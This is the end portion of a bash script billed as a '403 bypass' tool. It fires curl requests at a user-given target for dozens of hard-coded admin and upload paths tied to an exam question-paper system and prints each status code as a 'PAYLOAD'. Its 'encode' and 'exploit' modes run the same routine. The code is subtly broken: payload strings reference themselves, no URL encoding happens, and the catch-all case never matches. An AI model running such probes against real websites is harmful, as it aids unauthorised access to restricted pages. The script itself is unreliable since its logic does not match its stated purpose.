payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PortalQPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PortalQPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaperDatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaperDatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MgmtQPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MgmtQPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin-AccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin-AccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module_QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module_QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem-QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem-QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer_QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer_QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdminDashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdminDashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin-HandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin-HandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManagerControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManagerControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline-QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline-QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler-Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler-Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaperService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaperService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaperSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaperSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile-Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile-Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload-QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload-QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite-QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite-QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_POps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_POps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessor-QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessor-QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessing-QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessing-QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler-QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler-QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Upload-QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Upload-QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB_MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB_MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Monitoring-QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Monitoring-QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline_QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline_QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt_QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt_QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessor_QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessor_QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PortalQsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PortalQsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAutoModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAutoModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control-QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control-QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print


}
function 403bypass(){ 
	URL_Encode_Bypass
}
function prg(){
	set +u
	while :;do
		case $1 in
			'-u'|'--url')
					target=$2
					path=$(echo $2 | cut -d "/" -f4- )
					domain=$(echo $2 | cut -d "/" -f3)
					shift
					;;
			## modes
			
			'--encode')
				mode='encode'
				;;
      '--exploit')
				mode='exploit'
				;;
			'-h'|'--help')
					usage
					exit 0
					;;
			"")
					shift
					break
					;;
			'*')
				 		 echo "Error: unknown: ${target}"
                         usage
                         exit 127
                         ;;
		esac
		shift
	done

	if [[ -z "${target}" ]];then
        printf "\n[${red}!${end}] ${yellow}No URL/PATH <scheme://domain.tld/path> given. Make sure you go through the usage/help${end}\n\n"
        usage
        exit 127
    fi
	if [[ -z "${mode}" ]];then
        printf "\n[${red}!${end}] ${yellow}No mode given. Make sure you go through the usage/help${end}\n\n"
        usage
        exit 127
    fi

	
	if [ "${mode}" == 'encode' ];then
			echo "encode"
			banner
        	URL_Encode_Bypass
        	exit 0
	elif [ "${mode}" == 'exploit' ];then
			echo "exploit"
        	banner
			403bypass
        	exit 0
	fi
}
prg $@
tput sgr0
